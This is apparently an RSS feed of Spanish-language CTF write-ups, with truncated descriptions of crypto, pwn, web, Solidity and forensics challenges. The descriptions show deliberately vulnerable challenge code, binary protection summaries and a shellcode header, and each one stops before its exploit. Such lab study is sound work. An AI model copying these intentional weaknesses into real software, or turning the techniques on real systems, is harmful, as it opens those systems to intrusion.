$ docker run --rm -v "$(pwd)":/home/rocky -it ubuntu:18.04 bash root@c591782492e6:/# ldd /bin/sh linux-vdso.so.1 (0x00007ffde1fb3000) libc.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbcde5ef000) /lib64/ld-linux-x86-64.so.2 (0x00007fbcdec00000) root@c591782492e6:/# /lib64/ld-linux-x86-64.</description></item><item><title>Robotic</title><link>https://7rocky.github.io/ctf/imaginaryctf/robotic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/robotic/</guid><description>Se proporciona da este sitio web (https://eth007.me/):
Dado que el nombre del reto es &amp;ldquo;Robotic&amp;rdquo;, podríamos pensar en robots.txt, que es un archivo utilizado por los rastreadores web para indexar las páginas de un sitio web en motores de búsqueda como Google. Ahí tenemos el recurso:
Flag Si seguimos esa URL (que está marcada como Disallow para los rastreadores web), veremos la flag:
$ curl https://eth007.me/10b20f3d29ba114a.txt ictf{truly_not_a_robot}</description></item><item><title>Rolled my own Crypto</title><link>https://7rocky.github.io/ctf/imaginaryctf/rolled-my-own-crypto/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/rolled-my-own-crypto/</guid><description>Se nos proporciona el código fuente de un servidor que ejecuta un Algoritmo de Firma Digital (DSA, Digital Signature Algorithm):
from Crypto.Util.number import getPrime, isPrime, inverse from hashlib import sha256 from random import randrange q, g = 0, 2 while not isPrime(p := 2 * q + 1) or pow(g, q, p) != 1: q = getPrime(256) x = randrange(2, q) y = pow(g, x, p) def H(m): return int.from_bytes(sha256(m).digest(), 'big') def sign(m): k = randrange(2, q) r = pow(g, k, p) % q s = (H(m) + r * x) * inverse(k, q) % q return r, s def verify(m, r, s): u = inverse(s, q) return pow(g, u * H(m), p) * pow(y, u * r, p) % p % q == r def main(): print("</description></item><item><title>Ron was wrong, Whit is right</title><link>https://7rocky.github.io/ctf/imaginaryctf/ron-was-wrong-whit-is-right/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/ron-was-wrong-whit-is-right/</guid><description>Se nos proporciona el código fuente utilizado para cifrar la flag:
#!/usr/bin/env python from Crypto.Util import number flag = open("flag.txt", "rb").read() m = number.bytes_to_long(flag) e = 65537 for _ in range(1336): q = number.getPrime(1024) p = number.getPrime(1024) n = p * q c = pow(m, e, n) print(f"{n},{c}") También tenemos el resultado (1336 pares de n y c).
Contexto de RSA Vamos a recordar cómo funciona RSA: $n = p q$, donde $p$ y $q$ son números primos grandes.</description></item><item><title>Rookie Mistake</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/rookie-mistake/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/rookie-mistake/</guid><description>Se nos proporciona el código fuente en Python donde se cifra la flag:
import os from Crypto.Util.number import bytes_to_long, getPrime from sympy import * from secret import flag flag1 = bytes_to_long(flag[:len(flag)//2] + os.urandom(69)) flag2 = bytes_to_long(flag[len(flag)//2:] + os.urandom(200)) def genprime(): p = 2 while p.bit_length() &amp;lt; 1020: p *= getPrime(30) while True: x = getPrime(16) if isprime((p * x) + 1): return (p * x) + 1 break p,q = [genprime() for _ in range(2)] print("</description></item><item><title>rop-2.35</title><link>https://7rocky.github.io/ctf/other/seccon-ctf/rop-2.35/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/seccon-ctf/rop-2.35/</guid><description>Se nos proporciona un binario de 64 bits llamado chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Configuración del entorno También tenemos un Dockerfile:
FROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get -y update RUN apt-get -y install xinetd RUN groupadd -r pwn &amp;amp;&amp;amp; useradd -r -g pwn pwn RUN echo '#!/bin/bash\n\ service xinetd restart &amp;amp;&amp;amp; /bin/sleep infinity' &amp;gt; /etc/init.sh RUN echo 'service pwn\n\ {\n\ type = UNLISTED\n\ disable = no\n\ socket_type = stream\n\ protocol = tcp\n\ wait = no\n\ user = pwn\n\ bind = 0.</description></item><item><title>Rotating Secret Assembler</title><link>https://7rocky.github.io/ctf/imaginaryctf/rotating-secret-assembler/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/rotating-secret-assembler/</guid><description>Se nos proporciona un socket al que conectarnos. Al realizar la conexión se muestra el código fuente usado para cifrar la flag:
$ nc puzzler7.imaginaryctf.org 3000 ================================================================================ #!/usr/bin/env python3 from Crypto.Util.number import * class Rotator: QUEUE_LENGTH = 10 def __init__(self): self.e = 65537 self.m = bytes_to_long(open('flag.txt', 'rb').read()) self.queue = [getPrime(512) for i in range(self.QUEUE_LENGTH)] def get_new_primes(self): ret = self.queue[-2:] self.queue.pop() while(len(self.queue) &amp;lt; self.QUEUE_LENGTH): self.queue = [getPrime(512)] + self.queue return tuple(ret) def enc_flag(self): p, q = self.</description></item><item><title>Roten</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/roten/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/roten/</guid><description>Se nos proporciona un archivo PCAP (challenge.pcap) con muchos paquetes de red:
Encontrando el vector de ataque En primer lugar, filtremos por HTTP para leer solo paquetes de red de alto nivel:
El atacante está hurgando con el sitio web. Por ejemplo, está tratando de usar parámetros POST:
Si vamos al final de la captura de paquetes, veremos que los atacantes consiguen ejecutar comandos de sistema:
En el comando ls anterior, vemos un archivo llamado galacticmap.</description></item><item><title>Roulette</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/roulette/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/roulette/</guid><description>Se nos proporciona el código fuente del servidor en Python:
import socketserver import signal from twister import Twister def handle(self): signal.alarm(500) self.write("Welcome to the Casino") self.write("We are playing roulette today") money = 50 random = Twister() self.write("The wheel stops on a number between 0 and 31.") self.write("\n") while money &amp;gt; 0: self.write("You have {} coins".format(money)) self.write("What would you like to bet on:") self.write("1) Even") self.write("2) Odd") self.write("3) Number") option = int(self.</description></item><item><title>rps-casino</title><link>https://7rocky.github.io/ctf/other/dicectf/rps-casino/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/dicectf/rps-casino/</guid><description>Se nos proporciona el código fuente en Python del servidor:
#!/usr/local/bin/python import os from Crypto.Util.number import bytes_to_long def LFSR(): state = bytes_to_long(os.urandom(8)) while 1: yield state &amp;amp; 0xf for i in range(4): bit = (state ^ (state &amp;gt;&amp;gt; 1) ^ (state &amp;gt;&amp;gt; 3) ^ (state &amp;gt;&amp;gt; 4)) &amp;amp; 1 state = (state &amp;gt;&amp;gt; 1) | (bit &amp;lt;&amp;lt; 63) rng = LFSR() n = 56 print(f"Let's play rock-paper-scissors! We'll give you {n} free games"</description></item><item><title>RRSSAA</title><link>https://7rocky.github.io/ctf/other/ecsc-2023/rrssaa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/ecsc-2023/rrssaa/</guid><description>My primes are prefectly random. I wonder if you can find them.
Challenge contributed by CryptoHack
Challenge files:
output.txt RRSSAA.py Análisis del código fuente Se nos proporciona el siguiente script de Python que usa RSA para cifrar la flag:
flag = open("flag.txt", "rb").read().strip() assert len(flag) == 128 N = prod(get_prime(i) for i in range(2, len(flag))) print(hex(N), hex(pow(bytes_to_long(flag), 0x10001, N))) La configuración de RSA no es la habitual. Esta vez, tenemos una configuración de RSA multiprimo, donde cada factor primo del módulo $n$ se calcula con get_prime:</description></item><item><title>RSA 4.0</title><link>https://7rocky.github.io/ctf/other/seccon-ctf/rsa-4.0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/seccon-ctf/rsa-4.0/</guid><description>Se nos proporciona el código fuente en SageMath para cifrar la flag:
import os from Crypto.Util.number import bytes_to_long, getStrongPrime m = bytes_to_long(os.getenvb(b"FLAG", b"FAKEFLAG{THIS_IS_FAKE}")) e = 0x10001 p = getStrongPrime(1024, e=e) q = getStrongPrime(1024, e=e) n = p * q assert m &amp;lt; n Q = QuaternionAlgebra(Zmod(n), -1, -1) i, j, k = Q.gens() enc = ( 1 * m + (3 * m + 1 * p + 337 * q) * i + (3 * m + 13 * p + 37 * q) * j + (7 * m + 133 * p + 7 * q) * k ) ** e print(f"</description></item><item><title>RSA Beginner</title><link>https://7rocky.github.io/ctf/ctflearn/cryptography/rsa-beginner/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/cryptography/rsa-beginner/</guid><description>Se nos proporcionan estos números:
e: 3 c: 174422460809195453539354885823735245900172562989776845322302 n: 245841236512478852752909734912575581815967630033049838269083 Tenemos el exponente $e$, el módulo $n$ y el texto cifrado $c$.
Está claro que estamos ante un criptosistema RSA. Vamos a recordar cómo funciona RSA:
Se eligen dos números primos $p$ y $q$ de forma que el módulo $n = p \cdot q$. Luego se escoge un exponente $e$ (normalmente 3 ó 65537) que sea coprimo con $\phi(n) = (p - 1) \cdot (q - 1)$.</description></item><item><title>RSA Noob</title><link>https://7rocky.github.io/ctf/ctflearn/cryptography/rsa-noob/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/cryptography/rsa-noob/</guid><description>Se nos proporcionan estos números:
e: 1 c: 108193852288406505568171818194994500452464483136775497973720445 n: 1522605027922533360535618378132637429718068114961380688657908494580122963258952897654000350692006139 Tenemos el exponente $e$, el módulo $n$ y el texto cifrado $c$.
Está claro que estamos ante un criptosistema RSA. Vamos a recordar cómo funciona RSA:
Se eligen dos números primos $p$ y $q$ de forma que el módulo $n = p \cdot q$. Luego se escoge un exponente $e$ (normalmente 3 ó 65537) que sea coprimo con $\phi(n) = (p - 1) \cdot (q - 1)$.</description></item><item><title>RsaCtfTool</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/rsactftool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/rsactftool/</guid><description>Se nos proporciona una clave pública de RSA en formato PEM (pubkey.pem):
-----BEGIN PUBLIC KEY----- MIHeMA0GCSqGSIb3DQEBAQUAA4HMADCByAKBwHfR4yv+QfsHYSvLlS6LGW2cMDlB 3RlH1PteD7gN6nU4KhyMlRznOUQI7cgB082btMWs1usPYfUSrqkDs+1EDrzzw42M G683YvLlJRfcO2syc+YNJTDqtVHW5V3SNJ2J+WKCw0A5+ab2qA+sfhRFhvPJ7gsL vUj+blt5qweyGVheMOQvy+WXI+Vi/jwtlW3it25kBLZUoESDBg+HZKnxz3MgcJ6X roMdjPPwTH2f8sOrCTI1jJzNUYxJ9JQ0QPTrxwIDAQAB -----END PUBLIC KEY----- Podemos abrirla con Python para ver qué valores tenemos:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; from Crypto.PublicKey import RSA &amp;gt;&amp;gt;&amp;gt; with open('pubkey.pem') as f: ... key = RSA.import_key(f.read()) ... &amp;gt;&amp;gt;&amp;gt; key.e 65537 &amp;gt;&amp;gt;&amp;gt; key.n 1128137999850045612492145429133282716267233566834715456536184965477269592934207986950131365518741418540788596074115883774105736493742449131477464976858161587355643311888741515506653603321337485523828144179637379528510277430032789458804637543905426347328041281785616616421292879871785633181756858096548411753919440011378411476275900648915887370219369154688926914542233244450724820670256654513052812215949495598592852131398736567134556141744727764716053145639513031 Podemos tratar de factorizar el módulo $n$ para obtener los números primos privados $p$ y $q$ de un criptosistema RSA común.</description></item><item><title>RSAgain</title><link>https://7rocky.github.io/ctf/imaginaryctf/rsagain/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/rsagain/</guid><description>Se nos proporciona el código fuente utilizado para cifrar la flag:
from Crypto.Util.number import getPrime from secrets import randbelow flag = b'ictf{???????????????}' m = int.from_bytes(flag, 'big') p, q = getPrime(1024), getPrime(1024) n = p*q e1 = 7*randbelow(n) e2 = 7*randbelow(n) c1 = pow(m, e1, n) c2 = pow(m, e2, n) print('n =', n) print('e =', [e1, e2]) print('c =', [c1, c2]) Y la salida del script anterior:
n = 13761685901869725143768331354410331722080881206892978316226355274731948923788116922997132633408042821072846131527848521009073675634635614838798409359054501234184243307064644162477264359675732802892743867662331151938667918459410404673473173649215468906981810925676420598006739662864501852090661953622948938870414604397215114998121635153443376761422254645059647616441054621053792673427510353100668664861428374057353161172637671266095296358943110920490442118842860397633084527337550938542697953483620271948205306390349644786873542968679812523808277314879159441909502558166069319615649241027566862990490220961067181937669 e = [176102760168508342366248560703991436320546222245646770978202319048411166429566382514628949532380311738047680739422807353850798607282412088644610303686988373545251970947896120364153937039760741931013881201304685285276800581219089376477570281711773721947249912869605837122685995085027900352995492083277384406401003380587567849080200688516195340372450525399311095577291241729818923687928903049024986910768913495050369506538600090893434395973537955406795607398026050382337136405732255493959814072239958699297858559423614495730987219798816735202147878946461603285288373867465864345098892545645132818258947898456430424006, 3573981821831492277529738650073504616174769536804810418010981678130362702872320797121521713323943777400757776843305922735161754061510443680673867557929082126015295854646693109385804251924239205353662684744351670833911869748673257355076814511174326199099866635753979773946343291340766410907901834068770274767020404800822067211027120846913766665910218577234432145411130775944881987043775179494758158033064351482298980282644264138853891021708458121104223946012736356102642750591504966939159058542007824839461238347551623770276126868717421123099282388441377112476606520160468063905419246868567792524706613954405034280745] c = [2442003451487395252876121378320580564808335180996151717051522763081890537479875202133875395729806314814096885940653943728394923611282999540770370852775313679101585158491964936530361527619836260073209497935763771182203301056707656219921717552895243715201530990757549283670161276843945223662108755382731302991164300014685362347621843020642892430217171795396599343678165183180757721956247558358291103649246073117361482130651740512048690900488267309376415549379476398675385332885750364853460566103195169529710541031930399449866328356546569547859848315600711606485060302078139530732323306248727557394224647978798154455432, 5877775554635189664514035705193818872462952989637173497670868665060589927366277311749438728976759716021062894771294263103329901952516874052114135886783478914172913186895498679544398990747998647492211189869428581232686408690719184490347471496179923775491153260487724884204595180798615723157844735887389748026739587255981069056269993158062939424519078722321933831961667178045072850177889672933456786971303039062246151676207874781304093381264675070371899409850042467776910769703994219307749656616821280706978085046384421702389657326825914608919485710624515946600476275010829782060955742590243380095470169814313117059260] El tipo de cifrado es RSA, pero la implementación es incorrecta porque el mensaje m se está cifrando dos veces con diferentes exponentes públicos (e[0] y e[1]) y el mismo módulo público n.</description></item><item><title>runme.py</title><link>https://7rocky.github.io/ctf/picoctf/general-skills/runme.py/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/general-skills/runme.py/</guid><description>Se nos proporciona un script con código Python para que lo ejecutemos:
$ python3 runme.py picoCTF{run_s4n1ty_run}</description></item><item><title>Russian Roulette</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/russian-roulette/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/russian-roulette/</guid><description>Se nos proporciona un archivo de Solidity llamado RussianRoulette.sol:
pragma solidity 0.8.23; contract RussianRoulette { constructor() payable { // i need more bullets } function pullTrigger() public returns (string memory) { if (uint256(blockhash(block.number - 1)) % 10 == 7) { selfdestruct(payable(msg.sender)); // 💀 } else { return "im SAFU ... for now"; } } } Además, tenemos este Setup.sol, que es común en los retos de Solidity:
pragma solidity 0.8.23; import {RussianRoulette} from "</description></item><item><title>SaaS</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/saas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/saas/</guid><description>Se nos proporciona un binario de 64 bits llamado chall:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Análisis de código estático También tenemos el código fuente original en C (chall.c):
#include &amp;lt;errno.h&amp;gt; #include &amp;lt;error.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;seccomp.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;sys/mman.h&amp;gt; #include &amp;lt;sys/syscall.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #define SIZE 0x100 // http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+rax%2C+rax%0D%0Amov+rdi%2C+rsp%0D%0Aand+rdi%2C+0xfffffffffffff000%0D%0Asub+rdi%2C+0x2000%0D%0Amov+rcx%2C+0x600%0D%0Arep+stosq%0D%0Axor+rbx%2C+rbx%0D%0Axor+rcx%2C+rcx%0D%0Axor+rdx%2C+rdx%0D%0Axor+rsp%2C+rsp%0D%0Axor+rbp%2C+rbp%0D%0Axor+rsi%2C+rsi%0D%0Axor+rdi%2C+rdi%0D%0Axor+r8%2C+r8%0D%0Axor+r9%2C+r9%0D%0Axor+r10%2C+r10%0D%0Axor+r11%2C+r11%0D%0Axor+r12%2C+r12%0D%0Axor+r13%2C+r13%0D%0Axor+r14%2C+r14%0D%0Axor+r15%2C+r15%0D%0A&amp;amp;arch=x86-64&amp;amp;as_format=inline#assembly #define HEADER "\x48\x31\xc0\x48\x89\xe7\x48\x81\xe7\x00\xf0\xff\xff\x48\x81\xef\x00\x20\x00\x00\x48\xc7\xc1\x00\x06\x00\x00\xf3\x48\xab\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xe4\x48\x31\xed\x48\x31\xf6\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff" #define FLAG_SIZE 64 char flag[FLAG_SIZE]; void load_flag() { int fd; if ((fd = open("</description></item><item><title>Sacred Scrolls</title><link>https://7rocky.github.io/ctf/other/htb-unictf/sacred-scrolls/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/sacred-scrolls/</guid><description>Se nos proporciona un binario de 64 bits llamado sacred_scrolls:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Ingeniería inversa Usando Ghidra, podemos leer el código fuente descompilado en C. Esta es la función main:
void main() { undefined8 *puVar1; long i; byte bVar2; undefined wizard_tag[1528]; undefined8 uStack_110; undefined8 target; undefined8 local_100; undefined8 local_f8; undefined8 local_f0; undefined8 local_e8; undefined8 local_e0; undefined8 local_d8; undefined8 local_d0; undefined8 local_c8; undefined8 local_c0; undefined8 local_b8; undefined8 local_b0; undefined8 local_a8; undefined8 local_a0; undefined8 local_98; undefined8 local_90; undefined8 local_88; undefined8 local_80; undefined8 local_78; undefined8 local_70; undefined8 local_68; undefined8 local_60; undefined8 local_58; undefined8 local_50; undefined8 local_48; undefined *wizard_tag_copy; undefined8 local_38; undefined4 local_2c; bVar2 = 0; uStack_110 = 0x400ecc; setup(); uStack_110 = 0x400ed1; banner(); uStack_110 = 0x400edb; clean(); uStack_110 = 0x400eec; printf("</description></item><item><title>Sacred Scrolls: Revenge</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/sacred-scrolls-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/sacred-scrolls-revenge/</guid><description>Se nos proporciona un binario de 64 bits llamado sacred_scrolls:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Ingeniería inversa Usando Ghidra, podemos leer el código fuente descompilado en C. Esta es la función main:
void main() { undefined8 *puVar1; long i; byte bVar2; undefined wizard_tag[1528]; undefined8 uStack_110; undefined8 target; undefined8 local_100; undefined8 local_f8; undefined8 local_f0; undefined8 local_e8; undefined8 local_e0; undefined8 local_d8; undefined8 local_d0; undefined8 local_c8; undefined8 local_c0; undefined8 local_b8; undefined8 local_b0; undefined8 local_a8; undefined8 local_a0; undefined8 local_98; undefined8 local_90; undefined8 local_88; undefined8 local_80; undefined8 local_78; undefined8 local_70; undefined8 local_68; undefined8 local_60; undefined8 local_58; undefined8 local_50; undefined8 local_48; undefined *wizard_tag_copy; undefined8 local_38; undefined4 local_2c; bVar2 = 0; uStack_110 = 0x400efa; setup(); uStack_110 = 0x400eff; banner(); uStack_110 = 0x400f09; clean(); uStack_110 = 0x400f1a; printf("</description></item><item><title>Sacred Scrolls' Revenge</title><link>https://7rocky.github.io/ctf/other/htb-unictf/sacred-scrolls-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/sacred-scrolls-revenge/</guid><description>Este reto es una versión corregida de Sacred Scrolls. Casi todo el comportamiento del programa es el mismo que en la versión anterior, así que lea ese artículo antes que este.
Arreglaron el reto debido a una solución no intencionada (inyección de comandos):
$ ./sacred_scrolls ▄▞▀▀▀▜▄▖ ▗ ▖ ▗ ▖ ▗ ▖▟▞▖▘▗▖▚▘ ▝▀▄ ▖▝ ▘ ▝ ▝ ▝ ▘ ▝ ▝ ▝ ▘ ▝ ▖▌▀ ▖▖▚▘▝▗▝▝ ▗▝▄▖▘ ▘ ▗▗▞▘▚▝▝▝▗▝ ▘ ▖ ▗▚▖ ▗ ▖ ▗ ▗ ▖▗▄▜▝▚▝▝▖▘▘▝ ▖ ▖ ▘ ▗ ▖▛▞ ▖ ▖▘ ▖ ▗ ▘ ▖ ▗▝ ▗▄▞▚▗▗▘ ▝ ▖ ▖ ▖▘▀▀▖ ▖ ▗▖▛▚▗▝ ▖ ▗ ▝ ▝ ▘ ▖ ▘▗▗▗▝▌ ▗ ▗▄▞▀▚▝ ▖ ▖▝ ▖▝ ▖▗ ▖▘▝▗▗▄▞▘ ▖ ▝ ▗ ▖ ▄▞▀▚▗▝▝ ▖ ▘ ▘ ▗▝ ▖ ▘▗▗▝▖▞▞▌▜▐▐▖ ▗ ▘▄▖▀▀▗▝▝▗ ▝ ▗ ▘ ▖▖▘▖▝▗ ▚▝▖▖▌▌▌▙▞▌▀ ▘ ▄▞▞▀▗▝▞▝▖▝ ▘▝ ▖▘▖▖▘▞▝▖▚▚▐▐▟▟▞▘▘ ▖▝ ▄▖▛▀▖▞▖▌▘▘▝▖ ▖▝ ▗ ▝ ▖▗ ▘▖▖▖▞▐▗▚▚▙▙▛▀▝ ▄▄▜▚▙▄▄▀▝▗ ▄▝▝▘ ▘ ▘ ▘ ▗ ▖▗ ▝▖▄▐▐▐▟▟▜▜▝ ▘ ▐▟▛█▜▚▚▚▞▄▖▘ ▖ ▗ ▗ ▘▝ ▖▗▗▐▝▄▟▞▙█▐▝ ▐▚▛▞▜▚▟ ▝▚▚ ▘▝ ▝ ▝▗ ▖▘ ▗▝▝▖▞▖▌▙▜▙▙▀▘ ▗ ▝ ▗ ▘ ▜▐▚▐▐▜▟█▖ ▀▙▖▗ ▖▗▝ ▖▗ ▖▘▖▞▞▟▞▛▛▟▀ ▗ ▘ ▖ ▝▛▗ ▖▌▙▙█▘ ▗▚ ▖▗ ▗▗▗▗▚▐▐▐▞▛▟▞▛▝ ▗▝ █ ▖▗▀▝▝▛█▗ ▜▘▖▗▝▗▗▚▚▚▙▜▞▙▜▝ ▝ ▘ ▗ ▖ ▐▖▖ ▚ ▚▜▜▖▞▐▚▗▗▐▗▜▞▛▙▚▙▀ ▝ ▗ ▘ ▗ ▚▝▖▚▚▖▀▛▞▐▟▚▘▌▌▛▙▜▟▝▘ ▗ ▗ ▗ ▝▌▝▖▌▜▚▛▟█▛▙▜▞▛▛▞▘ ▖ ▝ ▖ ▗▝ ▘ ▝▙▗▐▐▐▜▜▙█▞▟▞▛▝ ▗ ▖ ▗ ▗ ▝ ▝▘▌▖▖▙▀▙▜▚▜▝ ▗ ▘ ▝▀▗▀▞▞▘▘ ▝ ▘ ▗▝ ▗ ▝ ▝ ▝ ▗▝ ▘ ▝ ▝ ▖▝ ▘ ▝ [+] All ⅀ ℙ ∉ ⎳ ⎳ ⅀ have been whiped out.</description></item><item><title>Safe Opener</title><link>https://7rocky.github.io/ctf/picoctf/reverse-engineering/safe-opener/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/reverse-engineering/safe-opener/</guid><description>Se nos proporciona un archivo fuente Java llamado SafeOpener.java:
import java.io.*; import java.util.*; public class SafeOpener { public static void main(String args[]) throws IOException { BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in)); Base64.Encoder encoder = Base64.getEncoder(); String encodedkey = ""; String key = ""; int i = 0; boolean isOpen; while (i &amp;lt; 3) { System.out.print("Enter password for the safe: "); key = keyboard.readLine(); encodedkey = encoder.encodeToString(key.getBytes()); System.out.println(encodedkey); isOpen = openSafe(encodedkey); if (!</description></item><item><title>same</title><link>https://7rocky.github.io/ctf/imaginaryctf/same/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/same/</guid><description>Se nos proporciona un código fuente en Python para cifrar la flag:
from Crypto.Util.number import getPrime, bytes_to_long m = bytes_to_long(open("flag", "rb").read()) n = getPrime(512)*getPrime(512) e = [1337,31337] print(n) print(pow(m,e[0],n)) print(pow(m,e[1],n)) Y tenemos la salida del programa:
88627598925887227793409704066287679810103408445903546693879278352563489802835708613718629728355698762251810901364530308365201192197988674078034209878433048946797619290221501750862580914894979204943093716650072734138749420932619469204815802746273252727013183568196402223549961607284086898768583604510696483111 45254947860172381004009381991735702721210786277711531577381599020185600496787746985669891424940792336396574951744089759764874889285927022268694128526139687661305707984329995359802337446670063047702309778972385903473896687843125261988493615328641864610786785749566148338268077425756876069789788618208807001704 16054811947596452078263236160429328686151351092304509270058479526590947874445940946506791900760052230887962479603369427120610506778471930164144528718052332194666418267005043709704814833963217926271924910466448499814399455203725279998913865531351070938872586642424346857094632491904168889134624707595846754719 El criptosistema utilizado es RSA, pero tiene una vulnerabilidad. La flag ($m$) se cifra dos veces como
$$ c_1 = m ^ {e_1} \mod{n} $$ $$ c_2 = m ^ {e_2} \mod{n} $$ El problema aquí es que el mismo mensaje se eleva a dos exponentes diferentes pero usando el mismo módulo $n$.</description></item><item><title>sanitize</title><link>https://7rocky.github.io/ctf/htb-challenges/web/sanitize/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/sanitize/</guid><description>Se nos proporciona esta página web:
Si miramos el código HTML de la página, veremos /debug:
Y ahí tenemos el código fuente de la aplicación web:
from flask import Flask, request, render_template, Response, url_for, g from sqlite3 import dbapi2 as sqlite3 from functools import wraps app = Flask(__name__) def get_db(): db = getattr(g, '_database', None) if db is None: db = g._database = sqlite3.connect(':memory:', isolation_level=None) db.row_factory = sqlite3.Row with app.app_context(): db.</description></item><item><title>Saturn</title><link>https://7rocky.github.io/ctf/htb-challenges/web/saturn/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/saturn/</guid><description>Se nos proporciona el siguiente sitio web:
Además, tenemos el código fuente del servidor, que está en Flask (Python).
Análisis del código fuente Este es el archivo app.py:
from flask import Flask, request, render_template import requests from safeurl import safeurl app = Flask(__name__) @app.route('/', methods=['GET', 'POST']) def index(): if request.method == 'POST': url = request.form['url'] try: su = safeurl.SafeURL() opt = safeurl.Options() opt.enableFollowLocation().setFollowLocationLimit(0) su.setOptions(opt) su.execute(url) except: return render_template('index.html', error=f"Malicious input detected.</description></item><item><title>Scrambled Pizzeria</title><link>https://7rocky.github.io/ctf/other/teamitaly-ctf/scrambled-pizzeria/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/teamitaly-ctf/scrambled-pizzeria/</guid><description>Se nos proporciona el código fuente del servidor en Python:
#!/usr/bin/python3 import numpy as np import numpy.typing as npt from PIL import Image import os def permutation( img: npt.NDArray[np.uint8], c: npt.NDArray[np.uint64] ) -&amp;gt; npt.NDArray[np.uint8]: height, width = img.shape cm = c[np.arange(max(height, width)) % len(c)] rows = np.argsort(cm[:height]) cols = np.argsort(cm[:width]) return img[rows, :][:, cols] def substitution( con: npt.NDArray[np.uint8], c: npt.NDArray[np.uint64] ) -&amp;gt; npt.NDArray[np.uint8]: ids = np.arange(np.prod(con.shape)) % len(c) return con ^ (c % 256).</description></item><item><title>scrambler</title><link>https://7rocky.github.io/ctf/other/securinets-ctf/scrambler/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/securinets-ctf/scrambler/</guid><description>Se nos proporciona un binario de 64 bits llamado scrambler:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) También tenemos el binario de Glibc (libc.so_1.6) de la instancia remota, por lo que podemos usar pwninit para parchear el binario y usar esta librería, de manera que el exploit sea igual en local y en remoto:
